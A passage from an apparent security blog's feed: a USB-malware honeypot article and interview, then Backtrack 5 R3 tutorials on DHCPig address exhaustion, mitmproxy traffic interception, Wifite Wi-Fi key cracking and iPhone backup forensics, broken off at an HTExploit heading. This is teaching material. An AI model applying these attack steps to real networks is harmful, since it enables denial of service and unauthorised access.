&lt;p&gt;&lt;img src=&quot;/images/posts/ghost-usb2/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, if there is a malware installed on this system, it will detect this removable device and write data to this emulated USB device automatically. The binaries or data written to this USB will be captured in the image file, which could be then taken to a separate OS and used for analysis. In this case i will just copy some file to the usb device and when we unmount it, we will notice that Ghost has detected those write requests.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ghost-usb2/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, we will have a quick look at the GUI version. Remember to run it as administrator. For the GUI version, the image file name will be gdgui.img. To mount an image, just click on Mount and it will emulate the USB device.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ghost-usb2/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once you unmount the device and if there was ever a write request to the drive, it will be shown to you as shown in the figure below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ghost-usb2/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can now copy the image file to a different isolated environment and use the captured data for analysis.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;USB malwares are becoming more and more common these days. The ghost USB honeypot project aims at emulating a USB device to capture any data that a malware may write to your USB device. This captured data can then be transferred over to another system for analysis.&lt;/p&gt;

&lt;h2 id=&quot;references&quot;&gt;References:&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Ghost USB Honeypot project&lt;br /&gt;
&lt;a href=&quot;http://http://code.google.com/p/ghost-usb-honeypot/&quot;&gt;http://code.google.com/p/ghost-usb-honeypot/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This article was originally published on the &lt;a href=&quot;http://resources.infosecinstitute.com/&quot;&gt;resources&lt;/a&gt; page at &lt;a href=&quot;http://infosecinstitute.com/&quot;&gt;Infosec Institute&lt;/a&gt;. For more information, please visit my author &lt;a href=&quot;http://resources.infosecinstitute.com/author/prateek/&quot;&gt;page&lt;/a&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Ghost USB Honeypot Part 1- Interview with Project Leader Sebastian Poeplau</title>
   <link href="https://bitbrain.github.io/2013/06/15/ghost-usb-honeypot-part-1-interview-with-project-leader-sebastian-poeplau.html"/>
   <updated>2013-06-15T04:05:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/06/15/ghost-usb-honeypot-part-1-interview-with-project-leader-sebastian-poeplau</id>
   <content type="html">&lt;p&gt;Malware threats have become very common these days. In the past, many honeypots have been created to detect malware propagation over the network. These honeypots trick the malware into believing that they are a part of the network. These honeypots are however isolated and once they have been infected, they can be used to study the behaviour of the malware. Network based malware have always been more successful, given the large number of systems they can affect in a short period of time.&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;These kind of network based malwares are however not able to infect systems that are isolated from the network. Such systems could contain highly confidential data. In the last few years, we have seen how USB based malwares can be used to target highly protected machines, i.e those which are not connected to the internet. This can allow these malwares to infect any system which supports plugging in of USB devices. One of the main examples of USB based malware is Stuxnet, a malware that used to spread via removable USB flash drives. In order to counteract the threat caused by USB based malware, the Ghost USB Honeypot project was created.&lt;/p&gt;

&lt;h2 id=&quot;ghost-usb-honeypot&quot;&gt;Ghost USB Honeypot&lt;/h2&gt;

&lt;p&gt;Ghost is a honeypot for detecting malware that spreads via USB devices. The honeypot currently supports Windows XP and Windows 7. The way Ghost works is that it first tries to emulate a USB thumb drive. If the malware identifies it as a USB thumb drive, it will trick the malware into infecting it. Ghost then looks for write based requests on the drive, which is an indication of a malware. A good video about the project by Sebastian Poeplau can be found &lt;a href=&quot;http://www.youtube.com/watch?v=9G9oo3b9qR4&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Interview with Project Leader Sebastian Poeplau&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The project is lead by Sebastian Poeplau, here is an interview with him about the Ghost USB Honeypot Project.&lt;/p&gt;

&lt;h3 id=&quot;1-can-you-please-start-by-telling-us-something-about-yourself-and-how-you-got-interested-in-malware-research-&quot;&gt;1. Can you please start by telling us something about yourself, and how you got interested in malware research ?&lt;/h3&gt;

&lt;p&gt;My name is Sebastian Poeplau, i am 22 years old and pursuing my studies in Computer Science from Bonn university, Germany. My interest with malware research began when i was working under a professor in second year of college and was offered some student assistantship. I liked this domain of security a lot and this is how it all began.&lt;/p&gt;

&lt;p&gt;This article was originally published on the &lt;a href=&quot;http://resources.infosecinstitute.com/&quot;&gt;resources&lt;/a&gt; page at &lt;a href=&quot;http://infosecinstitute.com/&quot;&gt;Infosec Institute&lt;/a&gt;. For more information, please visit my author &lt;a href=&quot;http://resources.infosecinstitute.com/author/prateek/&quot;&gt;page&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;2-can-you-please-tell-us-in-brief-about-the-the-ghost-usb-honeypot-project&quot;&gt;2. Can you please tell us in brief about the the Ghost USB honeypot project?&lt;/h3&gt;

&lt;p&gt;During the course of our research in malware analysis and detection, we realized that there was no such honeypot which detects malwares that spread over USB devices. So me and my project members at the Computer Science department at Bonn university decided to create one on our own. Ghost works by first emulating a USB storage device, which tricks the malware into infecting the honeypot. Currently, Ghost only supports Windows XP and Windows 7, but we plan to port it to different versions of Windows, mainly because malwares generally target Windows based systems.&lt;/p&gt;

&lt;h3 id=&quot;3-what-are-the-major-challenges-faced-in-performing-malware-analysis-today&quot;&gt;3. What are the major challenges faced in performing malware analysis today?&lt;/h3&gt;

&lt;p&gt;One of the major challenges is to be able to somehow analyze the huge amount of data that could be written to a honeypot to extract out the interesting bit of information. There are many good honeypots available that can capture the large amount of data, but there needs to be some kind of improvement in the current tools which could somehow help in automating the process of analyzing such a huge amount of data to get the interesting part.&lt;/p&gt;

&lt;h3 id=&quot;4-we-have-recently-seen-the-emergence-of-some-malwares-that-propagate-over-usb-devices-this-definitely-helps-the-malware-reach-those-systems-that-are-not-connected-to-the-internet-do-you-think-there-could-be-any-other-medium-in-the-future-over-which-malwares-can-propagate&quot;&gt;4. We have recently seen the emergence of some malwares that propagate over USB devices? This definitely helps the malware reach those systems that are not connected to the internet. Do you think there could be any other medium in the future over which malwares can propagate?&lt;/h3&gt;

&lt;p&gt;I think there’s just no need for malware authors to utilize another medium at the moment. These (network and USB) are the 2 major mediums over which malwares propagate. Also, since network based malwares have been so popular, i think we will see improvement in the way these malwares are created.&lt;/p&gt;

&lt;h3 id=&quot;5-currently-the-ghost-usb-honeypot-supports-only-windows-xp-and-windows-7-are-there-any-plans-to-port-it-to-other-operating-systems&quot;&gt;5. Currently, the Ghost USB honeypot supports only Windows XP and Windows 7. Are there any plans to port it to other operating systems?&lt;/h3&gt;

&lt;p&gt;Currently, we don’t have any plans to make it available for other operating systems like Linux and Mac OS. This is mainly because USB malware are mainly created for Windows based operating systems. We do have plans to make it available for other remaining versions of Windows though.&lt;/p&gt;

&lt;h3 id=&quot;6-what-were-the-major-challenges-that-you-faced-while-working-on-this-project&quot;&gt;6. What were the major challenges that you faced while working on this project?&lt;/h3&gt;

&lt;p&gt;One of the major challenges that i faced was to emulate USB storage devices. The api inside the windows kernel wasn’t designed to emulate USB device. So i had to find a certain level within the layered architecture of the kernel where i can start to do the emulation. The problem is that the malwares should somehow be tricked into believing that the device is a proper USB device, i.e with removable capability. So i had to first emulate the USB device and then make sure that the malware identifies it as a proper storage device.&lt;/p&gt;

&lt;h3 id=&quot;7-once-the-device-is-being-emulated-how-do-you-go-about-detecting-the-malware&quot;&gt;7. Once the device is being emulated, how do you go about detecting the malware?&lt;/h3&gt;

&lt;p&gt;It’s simple. We just look for write requests. Any kind of write request without the user’s permission is an indication of a possible malware.&lt;/p&gt;

&lt;h3 id=&quot;8-how-far-do-you-think-has-virtualization-helped-in-facilitating-the-process-of-malware-analysis-also-where-can-we-find-samples-of-malware-for-testing-purposes-&quot;&gt;8. How far do you think has virtualization helped in facilitating the process of malware analysis? Also, where can we find samples of malware for testing purposes ?&lt;/h3&gt;

&lt;p&gt;Virtualization has helped a lot. We no longer need a dedicated hardware to get infected with malware. It also helps in performing active analysis of the malware rather than just passive. This is because behaviour of some of the malwares could only be analyzed in a live environment. &lt;a href=&quot;http://www.offensivecomputing.net/&quot;&gt;Offensive Computing&lt;/a&gt; has a good database of malwares that we can use for testing purposes. Also, people can now deploy their own honeypots in a virtual environment and use it for testing.&lt;/p&gt;

&lt;h3 id=&quot;9-what-is-the-best-way-to-stay-in-touch-with-the-project&quot;&gt;9. What is the best way to stay in touch with the project?&lt;/h3&gt;

&lt;p&gt;Keep checking the project &lt;a href=&quot;http://code.google.com/p/ghost-usb-honeypot/&quot;&gt;homepage&lt;/a&gt;. We post regular updates on it. Also, please feel free to get in touch with me at (Sebastian dot poeplau) on my gmail account. Also, you can follow by &lt;a href=&quot;https://honeynet.org/blog/352&quot;&gt;blog&lt;/a&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Ghost USB Honeypot&lt;br /&gt;
&lt;a href=&quot;http://code.google.com/p/ghost-usb-honeypot/&quot;&gt;http://code.google.com/p/ghost-usb-honeypot/&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Sebastian Poeplau’s blog&lt;br /&gt;
&lt;a href=&quot;https://honeynet.org/blog/352&quot;&gt;https://honeynet.org/blog/352&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>Backtrack 5 R3 Walkthrough part 4</title>
   <link href="https://bitbrain.github.io/2013/06/15/backtrack-5-r3-walkthrough-part-4.html"/>
   <updated>2013-06-15T03:33:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/06/15/backtrack-5-r3-walkthrough-part-4</id>
   <content type="html">&lt;h2 id=&quot;dhcpig&quot;&gt;DHCPig&lt;/h2&gt;

&lt;p&gt;DHCPig is a very nice and handy little tool used to carry out an advanced DHCP exhaustion attack. It does this by grabbing all the IP addresses in its subnet by sending different DHCP requests for those IP addresses. It also finds out its neighbour’s IP addresses in its vicinity and releases their IP addresses by sending DHCP releases to the server. It then waits for a specific timeout on its sent packets, and if the timeout is reached, it means all the IP addresses in the network are now used up.However, some neighbours may still have IP addresses on the network that will have IP addresses conflicting with the IP addresses taken up the attacking machine. In this case, DHCpig can also knock all the windows systems offline by sending gratuitous ARP requests from all the IP address in the network. A gratuitous ARP request is used to check for duplicate IP addresses. If there is another device on the network using the same IP address (our attacking machine), the windows machine will receive an ARP reply from the attacker’s machine. This way, the Window’s machine will know that it has an IP address conflict with another system on the network. As a result, it will try to obtain another IP address but since all the IP addresses are now exhausted, it wont be able to get a new IP address.&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;Running DHCPig is as simple as giving just the interface as the argument. Type the command as shown in the figure below to run DHCPig. In the figure below, DHCpig tries to gather all the IP addresses in the network.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r4/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At the same time, it also sending DHCPRELEASE for the neighbors that it found on the network.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r4/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once this process is done, it will wait for a timeout for allocation of an IP address and if the timeout occurs, it will try to knock all the systems (windows based) offline by sending gratuitous ARP requests from their IP addresses. Note that this technique won’t work on a linux based system mainly because linux systems will hold on to their IP addresses even if they detect a conflict in the IP address.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r4/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If you want to know more about DHCpig, check out its &lt;a href=&quot;https://github.com/kamorin/DHCPig&quot;&gt;github page&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;mitmproxy&quot;&gt;MitmProxy&lt;/h2&gt;

&lt;p&gt;MitmProxy is an SSL capable HTTP proxy. It provides a console interface that allows the functionality of inspecting and manipulating traffic on the fly by acting as a man in the middle. Mitmdump is the command line version of mitmproxy. We can also save traffic flowing through the proxy for later analysis, and we can also replay the captured traffic whenever we want. We can also write python scripts to manipulate the traffic on the fly. MitmProxy can be found under the following directory in Backtrack 5 R3.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r4/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To run MitmProxy, just type ./mitmproxy and it will start the program. By default, mitmproxy listens on port 8080. Hence all the traffic passing through port 8080 would be seen by mitmproxy. Before we configure our browser to use port 8080 as a proxy, lets type “?” and see the different options that are available to us.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r4/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, configure your browser to use port 8080 on localhost as a proxy. Using our browser, lets now browse to a particular website. You will see that all the requests are being seen by mitmproxy. Notice the 2 arrows “»”. It shows you to select different request/reponse and perform actions on them. You can switch between different request/response using the j and k keys. Intercepted responses will be shown in an orange text. Currently there are no intercepted responses mainly because we haven’t configured mitmproxy to intercept any kind of response. Also, you can see the event log by holding down the “e” key.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r4/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can also select a particular flow and look at the details of it. To select any particular flow just take the pointer (the double arrows) next to it and press enter.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r4/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here you will see all the details of this request. You can also see the response by switching to the response tab. To switch to the response tab, just press Tab.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r4/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At any time, you can just press q to go back. Let’s now take a look at how mitmproxy can be used to intercept traffic and modify it. Mitmproxy interception works by taking certain intereption patterns which are python style regular expressions. A complete list of filter expressions can be found on http://mitmproxy.org/doc/filters.html.&lt;/p&gt;

&lt;p&gt;Let’s set up a simple filter here. To set up an interception filter, just press “i”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r4/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In this case i am going to set up a filter which looks for the string “ping” in the body and intercepts the request/response if found.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r4/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now lets browse over to ping.com from our browser. You will notice that the response gets intercepted. Intercepted request/reponse are marked with orange text.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r4/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If you want, you can edit the response before it is displayed in the browser. Just take your pointer over to it and press enter. Then press Tab to switch to the intercepted response. To edit the response, just press the “e” key and it will ask you which part of the response (code, message, header, raw body) you can edit. In this case, lets select header.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r4/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once you select header, you will be taken to an editor where you can edit the headers. In this case, i can just set the Cache-Control header value to “no-cache”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r4/13.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now we need to forward the response, just keep pressing q until you go to the main page where you will see all the flows, then select the flow that was just intercepted.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r4/14.png&quot; alt=&quot;14&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now press a to forward this response. You will see that the page will now load up in the browser and the subsequent requests/responses will now show up.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r4/15.png&quot; alt=&quot;15&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can also save all the traffic from mitmproxy to an output file. Just use the -w command to specify the output file name and mitmproxy will write all the traffic that it sees onto the output file. In this case, i save all the traffic to a file named capturedTraffic.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r4/17.png&quot; alt=&quot;17&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now i can replay all this traffic again whenever i want. Just use the following command to replay the traffic again. This feature could be very useful in automating certain tasks such as connecting to a network or downloading something from a particular url etc. The -n option asks mitmdump to start mitmdump without binding to a particular port.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r4/18.png&quot; alt=&quot;18&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can also use python scripts to modify the traffic programatically. The examples folder in mitmproxy contains a set of sample scripts that can help you do the task. ALl these scripts use the mitmproxy API to help perform the task. To know more about the mitmproxy API, go to http://mitmproxy.org/doc/scripts.html&lt;/p&gt;

&lt;p&gt;To use the script, just use the -s option and give the location of the script. In this case we will be using a simple script called upsidedowninternet.py that will check for PNG’s in the response and make them upside down.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r4/19.png&quot; alt=&quot;19&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And the result is images upside down. :). In later articles, we will learn about how we can use Mitmproxy to intercept SSL requests.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r4/20.png&quot; alt=&quot;20&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;references&quot;&gt;References:&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;DHCPig&lt;br /&gt;
&lt;a href=&quot;https://github.com/kamorin/DHCPig&quot;&gt;https://github.com/kamorin/DHCPig&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;MitmProxy official website&lt;br /&gt;
&lt;a href=&quot;http://mitmproxy.org&quot;&gt;http://mitmproxy.org&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This article was originally published on the &lt;a href=&quot;http://resources.infosecinstitute.com/&quot;&gt;resources&lt;/a&gt; page at &lt;a href=&quot;http://infosecinstitute.com/&quot;&gt;Infosec Institute&lt;/a&gt;. For more information, please visit my author &lt;a href=&quot;http://resources.infosecinstitute.com/author/prateek/&quot;&gt;page&lt;/a&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Backtrack 5 R3 Walkthrough part 3</title>
   <link href="https://bitbrain.github.io/2013/06/15/backtrack-5-r3-walkthrough-part-3.html"/>
   <updated>2013-06-15T03:12:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/06/15/backtrack-5-r3-walkthrough-part-3</id>
   <content type="html">&lt;p&gt;This article is in continuation to part 2 of the Backtrack 5 r3 walkthrough series. In this article we will we looking at some of the other new tools that were added into Backtrack 5 with the release of its latest version R3.&lt;/p&gt;

&lt;h2 id=&quot;wifite&quot;&gt;Wifite&lt;/h2&gt;

&lt;p&gt;Wifite is probabaly one of the best tools out there for cracking wireless networks. It just makes the whole task so simple for you by hiding all the intricate details of cracking a wireless network and making the whole process automated. It can crack WEP/WPA/WPS encrypted networks in a row. Some of the features of Wifite are…&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Automate the whole process of cracking wireless networks. Just run the python file wifite.py and it will start scanning for wireless networks nearby and will ask you to select which targets to attack.&lt;/li&gt;
  &lt;li&gt;Automatically detects hidden Essid’s by deauthenticating the connected client and checking the association and authentication packets to figure out the Essid.
&lt;!--more--&gt;&lt;/li&gt;
  &lt;li&gt;Backs up all the cracked passwords as well as the WPA handshakes so you can use them later.&lt;/li&gt;
  &lt;li&gt;You can customize the attack by selecting the type of attack (for e.g arp request replay for cracking WEP), select the pps (packets per second), set the channel to sniff on etc.&lt;/li&gt;
  &lt;li&gt;Gives you options in the middle of an attack. Just press Ctrl+C and it will ask you whether you want to quit, move on to the next target, or start cracking (if you think enough info has been collected) etc.&lt;/li&gt;
  &lt;li&gt;Very easy to upgrade. Just type &lt;em&gt;./wifite.py -upgrade&lt;/em&gt; to upgrade.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In this example, we will use wifite to crack WEP. To have a look at all the commands that wifite has to offer, just type &lt;em&gt;./wifite.py -h&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r3/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Firstly, let’s just try a generic attack. Just type &lt;em&gt;./wifite.py&lt;/em&gt; and you will see that it automatically puts a wireless interface into monitor mode and starts scanning for the nearby wireless networks.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r3/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see from the figure below, it found 2 nearby networks. It also lets you know if it found any clients connected to it as it is important sometimes to have a client associated with the network too. Press Ctrl + C when you think wifite has found all the nearby wireless networks.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r3/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It will now ask you to select the target for the network which you want to attack. You can also specify multiple networks seperated by commas. In this case we are interested in cracking the network with the ESSID “Infosec Test” which i set up for testing purposes. So i just type 1 and press enter.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r3/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once you have done this, you will see that it has started the attack against the network. In this case, it is using the arp-replay attack to crack the WEP key. The minimum number of IV’s for wifite to being cracking the WEP key is 10000 by default. But you can always change that in wifite. Also, it is always a good option to specify the pps for every attack as sometimes wifite will try to capture packets at higher rates which might turn your wireless card into a denial of service mode and hence stop the attack. The following command shown below helps to set both the things that we just discussed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r3/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Coming back to our previous attack against the “Infosec Test”, we see that it is still capturing IV’s.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r3/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once it has captured sufficient IV’s, you will notice that it cracked the WEP key. In this case, it found the WEP key to be “0987654321”. This is one of the reasons why wifite is such an awesome tool out there for wi-fi cracking.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r3/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Wifite also offers some other cool customization options. For e.g the following command will ask wifite to endlessly attack the target WEP network. This means that the program will not stop until it has cracked the WEP key for the target network. This attack could be handy in case when you are near a network that does not have any connected client to it or has very less activity. Just use this command and forget about it, wifite will automatically crack the WEP key as soon as it gathers sufficient information. You will also notice that it informs you whether you have already cracked the network by looking at its database. Having a database is another handy feature as it stores all the cracked passwords for all the networks as well as any captured WPA handshakes so that you can carry out a bruteforce attack whenever you want.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r3/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The following command will scan for all nearby WPA networks and store the WPA handshakes without carrying out a bruteforce attack. This feature could come in handy when you want to gather the information as quickly as possible in a particular location. You can always crack the WPA key using the handshake somewhere else.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r3/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If you want to know more about the wifite tool, i recommend you have a look at its official website &lt;a href=&quot;http://code.google.com/p/wifite/&quot;&gt;http://code.google.com/p/wifite/&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;iphone-analyzer&quot;&gt;Iphone Analyzer&lt;/h2&gt;

&lt;p&gt;Iphone Analyzer is an IOS device forensics tool. Unlike its name, Iphone Analyzer works for all IOS devices. It is used to analyze data from iTunes backups and provides a rich interface to explore the content of the device as well as recover them. In case of Mac OS X, Iphone analyzer automatically detects the location of the backup file. However, while using it with Backtrack 5 R3, you will have to provide it with the location of the backup file. It also allows you to analyze your IOS device over SSH, which is a very handy feature. Though this feature of Iphone analyzer is still in the beta version but this feature can be very useful especially when performing penetration tests on jailbroken IOS devices. Iphone analyzer allows you to see your text messages, photos, call records etc. IOS uses sqlite for managing its database. Iphone analyzer also allows you to analyze the various sqlite files, the schema which is used to enter data into the database as well as the contents of the file. It also allows you to browse the file structure like you would normally do via a terminal on a jailbroken device.&lt;/p&gt;

&lt;p&gt;To analyze a jailbroken device using Iphone Analyzer, click on File –&amp;gt; Open: Other –&amp;gt; Open over SSH. Then enter the IP address of the device and the ssh username and password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r3/15.png&quot; alt=&quot;15&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s use Iphone Analyzer to analyze a backup file. As you can see from the figure below, on a MAC OS, it automatically detects the locations of the backup files. While running it on Backtrack 5, you will have to give it the location of the backup file. Click on the backup file you want to analyze and then click on “Analyze Iphone backup”&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r3/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once this is done, you are presented with this beautiful interface that allows you to explore the contents of your backup file. At the top-center, you will see a lot of information about the IOS device like GUID, Serial Number, UDID, the last backup date, the phone number etc. On the bottom of this, you will see a detail section which contains all the information that Iphone Analyzer could obtain from the info.plist file. On the left side, you will see a Bookmarks and File System section. On the right side is the Manifest section. This gives you a lot of the information about the actual path of your applications in the directory structure. Please note that since this is not a jailbroken device, most of the information will be non-readable.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r3/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As shown in the figure below, the Bookmarks section will allow to find out the information which you are most likely to be looking for. It includes information about your Address Book, Voicemail, Location Map, Facebook Friends, Messages, incoming and outgoing calls etc.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r3/13.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Similarly, if you want, you can explore the filesystem of the device by clicking on the Filesystem tab. This will allow you to look at the various sqlite and plist files. The figure below shows information about a plist file that apple stores on your system named “com.apple.wifi.plist”. Using this file, it is possible to figure out the latest networks you have connected to. As you can see from the image below, the plist file tells me information about a network with the ESSID “Buzz@Barista”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r3/14.png&quot; alt=&quot;14&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can also analyze various sqlite files using Iphone Analyzer. The figure below shows the database structure of a sqlite file named ocspcache.sqlite3.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r3/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Alternatively, if you just want to look at the content stored in the sqlite file, you can click on “Browse Data” and this will show you the all the database information about the sqlite file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r3/17.png&quot; alt=&quot;17&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If you will at the very bottom, you will see a button named “Deleted fragments”. Another cool feature of Iphone analyzer is to recover deleted items from the database, though it is not as effective but still very useful under certain circumstances.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/bt5r3/16.png&quot; alt=&quot;16&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;references&quot;&gt;References:&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Wifite official website&lt;br /&gt;
&lt;a href=&quot;http://code.google.com/p/wifite/&quot;&gt;http://code.google.com/p/wifite/&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Iphone Analyzer user guide&lt;br /&gt;
&lt;a href=&quot;http://www.crypticbit.com/files/ipa_user_guide.pdf&quot;&gt;http://www.crypticbit.com/files/ipa_user_guide.pdf&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This article was originally published on the &lt;a href=&quot;http://resources.infosecinstitute.com/&quot;&gt;resources&lt;/a&gt; page at &lt;a href=&quot;http://infosecinstitute.com/&quot;&gt;Infosec Institute&lt;/a&gt;. For more information, please visit my author &lt;a href=&quot;http://resources.infosecinstitute.com/author/prateek/&quot;&gt;page&lt;/a&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Backtrack 5 R3 Walkthrough part 2</title>
   <link href="https://bitbrain.github.io/2013/06/15/backtrack-5-r3-walkthrough-part-2.html"/>
   <updated>2013-06-15T03:07:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/06/15/backtrack-5-r3-walkthrough-part-2</id>
   <content type="html">&lt;p&gt;This article is in continuation to &lt;a href=&quot;http://resources.infosecinstitute.com/backtrack-5-part-1/&quot;&gt;part 1&lt;/a&gt; of the Backtrack Walkthrough Series. In the previous articles we discussed some of the most important new tools that were added in the most recent revision of Backtrack 5 like Dnmap, Fern-Wifi-Cracker etc. In this article we will look at some of the other main tools added in Backtrack 5 R3.&lt;/p&gt;

&lt;!--more--&gt;

&lt;h2 id=&quot;htexploit&quot;&gt;HTExploit&lt;/h2&gt;

